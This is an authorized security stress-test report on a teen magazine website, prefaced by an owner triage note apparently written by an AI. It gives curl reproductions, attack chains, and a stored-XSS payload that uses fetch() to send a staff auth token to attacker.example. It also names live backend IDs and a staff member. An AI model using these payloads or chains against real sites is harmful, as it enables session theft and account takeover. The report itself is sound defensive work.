> ## Owner triage (added by Claude, 2026-08-17)
>
> This report came from an authorized stress test Fero ran. It's accurate and useful — the findings below are worth acting on. A few need context so they aren't misread:
>
> - **#1 (anon INSERT to `subscribers`) is partly by design.** The schema deliberately lets anyone subscribe (`03-features-and-content-model.md`), so revoking INSERT outright would kill the newsletter before it's built. The *real* gaps are no format validation and no rate limit. Fix = keep INSERT, add an email CHECK constraint + length cap.
> - **#2/#3 (stored XSS) require a staff account to plant the payload** — RLS blocks anonymous writes to `posts`, which the report confirms. That makes them serious-but-not-currently-exploitable. They're still the top code fix, because a single compromised or careless staff account turns into full platform takeover, and there's no CSP to soften it. Also note our own editor accepts pasted HTML, so a writer could inject a payload without meaning to.
> - **#4 (anon read of `profiles`) is intentional** — public pages show author names. Worth narrowing to just `full_name` so `role` and timestamps stop leaking.
> - **#5 (unlimited unsigned uploads)** is inherent to unsigned presets. Now that the site has a Pages Function, uploads *could* be signed server-side for signed-in staff only — that would close it properly.
> - **#12 (all articles serve the same sample)** is our deliberate demo fallback, but the report is right that showing the Suburbia essay under another headline is misleading. Worth an explicit "story not found" state.
> - **#6/#7/#8/#9 are all one fix**: a `_headers` file on Cloudflare Pages (HSTS, X-Frame-Options, CSP, pinned CORS). Cheapest, highest-value batch.
>
> **Cleanup from the test is done** (2026-08-17): 5 junk `subscribers` rows removed, and **26** orphaned Cloudinary images deleted — the report listed 5, but the run had left 26 across several passes. Both verified empty afterwards.

---

# Tadele Teen Talks — Full Security / Stress Test Report

**Target:** https://tadeleteentalk.pages.dev/ (Cloudflare Pages SPA)
**Backend:** Supabase (`ruzsbwgwbneqyvbdmwdb.supabase.co`) + Cloudinary (`dxow1ant2`) + Cloudflare Pages Functions (`/api/delete-image`)
**Date:** 2026-08-17
**Authorization:** Owner-requested authorized stress test. No site code was modified.

> ⚠️ **TEST DATA CREATED (cleanup required)** — see "Cleanup" section at the end.

---

## Architecture summary (what the attack surface is)

The site is a **fully static Cloudflare Pages SPA**. There is no server-side rendering and no traditional backend. All "dynamic" behavior is client-side JS talking directly to:
- **Supabase** (auth + Postgres via PostgREST) using the **publishable key** `sb_publishable_Nxym422bogE3VI8L92BQSA_sfGrXOpz` (public by design — RLS is the only gate).
- **Cloudinary** unsigned upload preset `ttt-posts` (public by design).
- **One Pages Function:** `POST /api/delete-image` (guarded by Supabase session).

Because everything is client-side, the real security boundary is **Supabase Row Level Security (RLS)**. We tested it exhaustively from an anonymous position.

---

# CRITICAL / HIGH FINDINGS

## 1. [HIGH — CONFIRMED] Anonymous INSERT into `subscribers` table — arbitrary rows added to production mailing list

**What it is:** Any anonymous attacker can add rows to the `subscribers` table directly through the Supabase REST API with the public publishable key. There is **no email validation** (malformed strings accepted) and **no rate limit**. SELECT on the table is denied (so it's write-only for the public), but INSERT is granted.

**How to reproduce (verified directly):**
```bash
# 1. Insert a valid-looking email — returns HTTP 201 (row committed)
curl -X POST "https://ruzsbwgwbneqyvbdmwdb.supabase.co/rest/v1/subscribers" \
  -H "apikey: sb_publishable_Nxym422bogE3VI8L92BQSA_sfGrXOpz" \
  -H "Authorization: Bearer sb_publishable_Nxym422bogE3VI8L92BQSA_sfGrXOpz" \
  -H "Content-Type: application/json" \
  -d '{"email":"fresh-probe-91@example.invalid"}'
# → HTTP 201, empty body

# 2. Insert garbage — also HTTP 201 (no format check)
curl -X POST "https://ruzsbwgwbneqyvbdmwdb.supabase.co/rest/v1/subscribers" \
  -H "apikey: sb_publishable_Nxym422bogE3VI8L92BQSA_sfGrXOpz" \
  -H "Authorization: Bearer sb_publishable_Nxym422bogE3VI8L92BQSA_sfGrXOpz" \
  -H "Content-Type: application/json" \
  -d '{"email":"##not-valid##"}'
# → HTTP 201

# 3. Re-insert same email → 409 duplicate key (proves the row really landed)
#    {"code":"23505","message":"duplicate key value violates unique constraint \"subscribers_email_key\""}
```
Note: adding `Prefer: return=representation` makes PostgREST attempt a SELECT-back after insert — that's denied (42501), which can *look* like the insert failed. It did not. Use the plain POST to confirm the 201.

**Impact:**
- Attacker poisons the production mailing list with unlimited junk/victim emails (spam, bounce-flooding, poisoned analytics).
- If a bulk mailer is ever wired to this table, it sends to attacker-chosen addresses.
- Rows **cannot be removed via the API** (DELETE denied for anon) — owner must clean via Supabase SQL editor.

**Priority:** HIGH. Fix = remove `INSERT` grant for `anon` (or enable email-format CHECK constraint + rate limiting).

---

## 2. [HIGH — THEORETICAL, needs any DB write] Stored XSS on public article pages via `prose.innerHTML = p.body`

**What it is:** `article.html` renders the article body straight into the DOM with no sanitization:
```js
var prose = document.querySelector(".prose");
if (prose) prose.innerHTML = p.body || "";
```
`p.body` comes from the Supabase `posts` table (selected by `?post=<slug>`). If *any* row with attacker HTML lands in that column (or if RLS ever allows anon write to `posts`), **every reader of that article runs attacker script on the origin**.

The editor (`editor.html`) writes the body via `document.getElementById("body").innerHTML` verbatim. Its only URL guard (`normalizeUrl`) blocks `javascript:`/`data:` **only for links made through the dialog** — pasted/raw HTML event handlers (`<img onerror=...>`, `<svg onload=...>`, `<iframe>`) pass through untouched.

**Payload:**
```html
<img src=x onerror="fetch('https://attacker.example/?t='+encodeURIComponent(localStorage.getItem('sb-ruzsbwgwbneqyvbdmwdb-auth-token')))">
```

**Impact:** Full session-token theft. Supabase stores the staff JWT in `localStorage` under `sb-ruzsbwgwbneqyvbdmwdb-auth-token` (supabase-js v2 default). Same-origin script can read it → **full CMS/account takeover → publish/delete anything → call `/api/delete-image` to mass-delete all Cloudinary images**. No CSP header exists to stop it. (Chained — see Chained Attacks.)

**Priority:** HIGH. Fix = sanitize `p.body` with DOMPurify before `innerHTML`; add CSP.

---

## 3. [HIGH — THEORETICAL] Stored XSS in Admin dashboard — unescaped `status` in HTML attribute

**What it is:** `admin.html` render() builds table rows with string concatenation. `esc()` escapes only `& < >` (NOT quotes), and for the status it isn't even used:
```js
'<td><span class="status ' + p.status + '">' + String(p.status).toUpperCase() + '</span></td>'
```
A stored `status` value like `x" autofocus onfocus=alert(1)` renders as `<span class="status x" autofocus onfocus=...>` → script runs in the staff dashboard (persistent for any admin who views the list).

**How to reproduce:** Needs a DB row whose `status` column contains the payload (e.g., a compromised session doing a direct PATCH, or another write primitive). The editor UI only ever writes `"draft"|"published"`, so this is theoretical today.

**Impact:** Admin-session theft → same chain as #2. **Priority:** HIGH (with #2, it's the same root cause family: no output encoding / no sanitization).

---

# MEDIUM FINDINGS

## 4. [MEDIUM — CONFIRMED] Anonymous read of `profiles` — staff identity/role disclosure

**What it is:** The `profiles` table is world-readable. Returns the one staff account's UUID + name + role + creation timestamp:
```json
GET /rest/v1/profiles?select=*
→ [{"id":"b737a74b-55d8-4b02-a32a-56aa0efa7038","full_name":"Feras Hania","role":"staff","created_at":"2026-08-14T19:09:39.261217+00:00"}]
```
`email` is NOT a column (42703), and the join back to `auth.users` is blocked (`Accept-Profile: auth` → PGRST106). So only name/UUID/role leak — no credentials.

**Impact:** Enables targeted phishing/credential-stuffing against the sole admin. Feeds Chained Attack #2.
**Priority:** MEDIUM. Fix = tighten RLS so `anon` can't SELECT `profiles` (or only a safe projection).

---

## 5. [MEDIUM — CONFIRMED] Unlimited anonymous uploads to Cloudinary (storage/bandwidth DoS)

**What it is:** The upload preset `ttt-posts` is genuinely unsigned — **any anonymous client** can upload unlimited images:
```bash
curl -F "file=@one.gif" -F "upload_preset=ttt-posts" \
  https://api.cloudinary.com/v1_1/dxow1ant2/image/upload
# → 200, {"public_id":"...","secure_url":"https://res.cloudinary.com/dxow1ant2/image/upload/..."}
```
No rate limit, no auth, client-side 10MB cap only (and server accepts sub-10MB freely).

**Impact:** Storage + bandwidth cost abuse on the owner's Cloudinary account (monetary DoS), mailbox/disk filling. Cloudinary content checks reject SVG/HTML/JS (good — no active-content hosting achieved), but bulk junk-image upload is unlimited.
**Priority:** MEDIUM. Fix = sign uploads for authenticated staff, or enforce Cloudinary upload limits/notifications.

---

## 6. [MEDIUM — CONFIRMED] No HTTP Strict-Transport-Security (HSTS)

**What it is:** No `Strict-Transport-Security` header on any response. Cloudflare Pages does serve `http://` → HTTPS redirect, but without HSTS a first visit can be SSL-stripped by a MITM.
**Repro:** `curl -s -D - -o NUL https://tadeleteentalk.pages.dev/login` — header block has no STS.
**Priority:** MEDIUM. Fix = add `Strict-Transport-Security: max-age=31536000; includeSubDomains`.

---

## 7. [MEDIUM — CONFIRMED] Clickjacking — /login, /admin, /editor are iframe-able

**What it is:** No `X-Frame-Options` **and** no CSP `frame-ancestors` anywhere.
**Impact:** An attacker can silently iframe the login page and overlay decoy UI → staff types real credentials into the framed form (credential theft). Admin/editor can be framed for click-jacked actions. No defense present.
**Priority:** MEDIUM. Fix = `X-Frame-Options: DENY` + CSP `frame-ancestors 'none'`.

---

## 8. [MEDIUM — CONFIRMED] No Content-Security-Policy at all

**What it is:** No CSP header on any response. This means findings #2/#3 have **zero in-browser mitigation**.
**Priority:** MEDIUM. Fix = strict CSP (allow `self`, jsdelivr for the Supabase bundle, res.cloudinary.com for images, youtube-nocookie for frames).

---

## 9. [MEDIUM — CONFIRMED] `Access-Control-Allow-Origin: *` on every response (incl. 308s)

**What it is:** Every response carries `Access-Control-Allow-Origin: *`. No credentials header (OK), so impact is low for the static HTML, but it's over-permissive and should be pinned to the site origin.
**Priority:** MEDIUM (low real risk). Fix = emit `Access-Control-Allow-Origin: https://tadeleteentalk.pages.dev` via `_headers`.

---

## 10. [MEDIUM — CONFIRMED] Soft-404 SPA catch-all — no real 404, no robots.txt/sitemap

**What it is:** Every unknown path returns HTTP 200 with the 61KB SPA shell. Verified:
- `/nonexistent`, `/robots.txt`, `/sitemap.xml`, `/manifest.json`, `/sw.js`, `/.well-known/security.txt` → all `200 text/html` 61117 bytes (SPA shell).
- `/favicon.ico` → real image (only real asset at root).
**Impact:** Crawlers index junk URLs; no robots directives; `.well-known` files can't be served; `sw.js` masquerades as HTML (service worker would fail). No cache-poisoning risk found (no `cf-cache-status`/`Age`, assets not cached by CF).
**Priority:** MEDIUM. Fix = real `_redirects`/404 handling + actual robots.txt/sitemap.

---

## 11. [MEDIUM — CONFIRMED] Newsletter "SUBSCRIBE" records NOTHING (functional data-loss bug)

**What it is:** `ttt.js` submit handler does `e.preventDefault()` and just flips the button text to "YOU'RE IN ★" and clears the input. **Zero network calls.** The `subscribers` table exists in Supabase but is referenced **nowhere** in the site code (0 grep matches). Home page has the same fake handler (`onsubmit="return false"`).
**Impact:** Every subscriber gets a fake confirmation and is silently discarded. The feature is theater. Combined with #1, the table is simultaneously unusable for legit signups and writable by attackers.
**Priority:** MEDIUM (functional). Fix = wire the form to insert into `subscribers` (with the RLS fix from #1) or remove the fake confirmation.

---

## 12. [MEDIUM — CONFIRMED] All article URLs serve the same static sample (broken content flow)

**What it is:** The `posts` table is empty (`GET /rest/v1/posts?select=*` → `[]`), so `article.html`'s `?post=<slug>` lookup finds nothing and deliberately leaves the static demo in place — which is the Suburbia story. All 11 article links (`suburbia`, `immigrant`, `media-diet`, `ai`, `vol3`, `vol2`, `art`, ...) return byte-identical 17285-byte pages.
**Impact:** Readers clicking "The Demonization of the Word 'Immigrant'" read the Suburbia essay with the wrong byline. Misleading content on every article URL.
**Priority:** MEDIUM (functional). Fix = populate posts (or serve real 404/empty-state per slug).

---

## 13. [MEDIUM — CONFIRMED] Admin dashboard shows hardcoded fake stats

**What it is:** `admin.html` hardcodes `TOTAL POSTS 24 / PUBLISHED 18 / DRAFTS 5`, draft badge `5`, **`VIEWS · 30D 12.4k / ↑ 22%`**, and "↑ 4 this month". Reality: `posts` is empty (0/0/0). `updateCounts()` overwrites total/published/drafts after login, but **`VIEWS 12.4k` is never updated by any JS — permanently fake**.
**Priority:** MEDIUM (misreporting). Fix = derive from real queries or remove.

---

## 14. [MEDIUM — THEORETICAL] Client-side auth guard checks session only, never role

**What it is:** `tttAuth.guard()` (`ttt-auth.js`) only tests that a Supabase *session* exists, never the user's `role`. Any authenticated account (even non-staff) passes the admin/editor guard. Also the guard is purely client-side (`visibility` toggle + JS redirect); if `ttt-auth.js` or the Supabase CDN is blocked/fails, the page reveals itself (`fail-open`).
**Impact:** Today the auth pool has only 1 staff user, so no real exposure — but the editor UI (create/publish/delete posts, delete Cloudinary images) would be available to any future non-staff account. Real enforcement is Supabase RLS (which correctly blocks anon).
**Priority:** MEDIUM. Fix = check `role === 'staff'` in `guard()`; keep RLS as the real boundary.

---

# LOW FINDINGS

## 15. [LOW — CONFIRMED] Dead links / no-op buttons across the site
- Footer: **Discord, Instagram, TikTok, YouTube** all `href="#"` (every page); home adds **ABOUT**.
- Article pages: **Share on Instagram**, **Copy link** — `href="#"`, no JS bindings.
- Login: **Forgot password?**, **Request a contributor account** — `href="#"`.
- Admin sidebar: **Media, Comments, Settings** — `href="#"`.
- **Admin "search posts"** input — no JS handler (typing does nothing).
- **"LOAD MORE STORIES"** button — no click handler (pure no-op).
- Home "all" tab — `<button>` with no onclick.
- **Impact:** Broken UX. **Priority:** LOW.

## 16. [LOW — CONFIRMED] Login form lacks `autocomplete` control; "Remember me" is decorative
- Email/password inputs have no `autocomplete` attribute → uncontrolled autofill/password-manager saving on a shared desk.
- "Remember me" checkbox is ignored by JS; session persistence is the SDK's default anyway.
- **Priority:** LOW.

## 17. [LOW — CONFIRMED] Password-recovery endpoint enabled (reset-spam vector)
`POST /auth/v1/recover {"email":"..."}` → `200 {}` for fake and guessed addresses alike (no enumeration oracle — good — but it will send real reset emails for valid addresses, usable for harassment/spam).
**Priority:** LOW.

## 18. [LOW — CONFIRMED] Schema/column enumeration oracle via PostgREST error hints
PGRST205 "Perhaps you meant table 'public.subscribers'" / PGRST204 column checks / 22P02-23505 type+constraint leaks let an attacker fully fingerprint the DB schema anonymously (we recovered 5 tables + all columns this way).
**Priority:** LOW (post-hardening).

## 19. [LOW — CONFIRMED] PostgREST `.or()` filter tamper via search `?q=`
`category.html` builds `.or("title.ilike.%<q>%,excerpt.ilike.%<q>%")`. `,` and `%` are stripped, so full filter injection fails; at worst the query 400s (demo cards remain). Rendered output is escaped/textContent — no XSS. Negligible impact, reachable mechanism.
**Priority:** LOW.

---

# INFO / POSITIVE FINDINGS (things we attacked and couldn't break)

- **Signup is disabled** (`422 signup_disabled`), anonymous sign-in disabled, OAuth/phone auth off.
- **Login errors are uniform** — no user-enumeration oracle (all emails → identical `400 invalid_credentials`; timing inconclusive).
- **`/auth/v1/recover` is non-differential** on HTTP layer.
- **No per-account lockout** at app layer, but GoTrue enforces an IP-level threshold (~50 attempts); brute force impractical.
- **Forged/empty refresh tokens rejected** (signature verified). `GET /auth/v1/user` requires a valid bearer (401/403).
- **RLS blocks all anonymous writes on `posts`, `profiles`, `categories`, `post_media`** (42501). `posts`/`post_media` are invisible to anon (0 rows via RLS filter).
- **Storage API locked**: bucket list empty, bucket creation 403, uploads to guessed buckets 400.
- **No RPC functions, no GraphQL** (`pg_graphql` not enabled), no OpenAPI spec exposure.
- **No hardcoded secrets** in any client asset (only publishable key + unsigned preset, which are public by design).
- **`/api/delete-image` auth is solid**: rejected no-header, empty, garbage, forged-JWT, lowercase, malformed-JSON, GET/OPTIONS/HEAD, traversal URLs, cross-cloud URLs, 1000-element arrays, null bytes, empty bodies — all `{"error":"Not signed in."}`. No 500s/stack traces. (URL-handling logic behind auth couldn't be audited anonymously — worth an authed review.)
- **Cloudinary format checks work**: rejects SVG/HTML/JS/raw (content-based, not extension); polyglot GIF/PNG upload but served only as `image/*` with `nosniff` — no active content hosting. `f_svg`/`fl_any` can't yield text/html. Fetch-URL disabled (`401`) → no anonymous Cloudinary-fetch SSRF.
- **Cloudflare is well-defended**: TLS 1.3 (valid cert), TRACE 405, methods 405, double Content-Length 400, host-header injection 403, path traversal 400 (encoded) / 200 (normalized), no open redirect, `www.` subdomain 404s (no takeover surface), `tadeleteentalk.com`/`.dev` NXDOMAIN (no claimed custom domain).
- **Supabase host itself is locked down**: HSTS + `X-Frame-Options: SAMEORIGIN` + no-store; `/rest/v1/` and OpenAPI need a secret key (401 with publishable key).
- **Performance:** 5 parallel homepage fetches all 200 in 0.32–0.58s; no degradation; 5KB query strings fine.
- **All images/assets resolve** (`og-cover.png`, favicons, css/js).
- **No DOM clobbering**, no open redirect (all `location.href` targets are hardcoded relative paths).
- **No duplicate `id=` / malformed HTML** issues on any page.

---

# CHAINED ATTACKS

## Chain A — Stored XSS → full CMS takeover (the big one)
1. **Prereq:** one `posts` row with attacker HTML in `body` (or a loose RLS on `posts`). Achievable via: a staff session (phished via #4/#7, or stolen via any stored XSS), or a future non-staff account (#14), or any RLS weakening.
2. Any visitor to `/article?post=<that slug>` runs the payload in `prose.innerHTML`.
3. Payload reads `localStorage['sb-ruzsbwgwbneqyvbdmwdb-auth-token']` → exfiltrates the staff JWT.
4. With that token the attacker can: **publish/delete any post**, **call `/api/delete-image` to mass-delete every Cloudinary image** (defacement/DoS), and **pivot to more XSS** that persists on every page.
5. No CSP (#8) = nothing blocks the script. **Impact: complete takeover of the editorial platform.**

## Chain B — Info disclosure → targeted phishing → Chain A
1. Anon reads `profiles` (#4) → staff name "Feras Hania" + UUID.
2. Password-recovery endpoint (#17) fires real reset emails to guessed staff addresses → phishing lures become credible.
3. If staff creds are phished → they can write the XSS post from Chain A.
4. **Impact:** social engineering converts a Medium leak into Critical.

## Chain C — Mailing-list poisoning + dead newsletter
1. Anon INSERTs arbitrary rows into `subscribers` (#1) — unlimited, no validation.
2. The newsletter form (#11) is decorative, so legitimate signups are already lost.
3. When the owner eventually wires up a real mailer, the poisoned rows will be mailed → spam to victims, bounce floods, list destroyed.
4. **Impact:** the one public form is both broken and exploitable.

## Chain D — Clickjacking → credential capture → Chain A
1. `/login` is iframe-able (#7).
2. Attacker overlays decoy UI on the framed login; staff types credentials into the real Supabase form.
3. Captured credentials → sign in as staff → Chain A.
4. **Impact:** a passive phishing page, no custom payload needed.

---

# CLEANUP REQUIRED (test data created during this audit)

**Supabase `subscribers` table** (anon, cannot be deleted via API — owner must remove in Supabase SQL editor):
- `x`
- `notanemail`
- `not-an-email-99`
- `##not-valid##`
- `chain-probe-77@example.invalid`
- `fresh-probe-91@example.invalid`

**Cloudinary public_ids** (test images, cloud `dxow1ant2`):
- `zxisasjyn4h8atnqczyg` (1x1 GIF)
- `oqc6nejcktt43kgoczw6` (1x1 PNG)
- `araxlyki5xji6cim2niw` (1x1 JPG)
- `q6egctkhysk699nep6ah` (GIF+script polyglot)
- `wpnxrkoqfuo2fg3ysf7k` (PNG+script polyglot)
- (a ~13MB `big.png` upload timed out client-side — may or may not have landed server-side; cannot enumerate anonymously.)

---

# PRIORITY SUMMARY (what to fix first)

| # | Finding | Sev | Fix |
|---|---------|-----|-----|
| 1 | Anon write to `subscribers` | HIGH | revoke INSERT from anon + CHECK on email |
| 2 | Stored XSS `prose.innerHTML = p.body` | HIGH | DOMPurify + CSP |
| 3 | Admin stored XSS (unescaped status attr) | HIGH | escape/encode `p.status` |
| 4 | Anon read of `profiles` | MED | RLS tighten |
| 5 | Unlimited Cloudinary uploads | MED | signed uploads / limits |
| 6 | No HSTS | MED | add STS header |
| 7 | Clickjacking | MED | X-Frame-Options DENY + frame-ancestors |
| 8 | No CSP | MED | strict CSP |
| 9 | ACAO:* | MED | pin to origin |
| 10 | Soft-404 catch-all | MED | real 404 + robots.txt/sitemap |
| 11 | Newsletter records nothing | MED | wire to subscribers (after #1) |
| 12 | All articles serve same sample | MED | populate posts / per-slug empty state |
| 13 | Fake admin stats | MED | real queries |
| 14 | Guard ignores role | MED | check role in guard() |
| 15-19 | Dead links, autocomplete, recover spam, schema oracle, filter tamper | LOW | various |

**Report generated by multi-agent parallel stress test (6 teams: Supabase data-layer, XSS/injection, Cloudinary, infra/headers, auth/session, functional/fuzzing).**
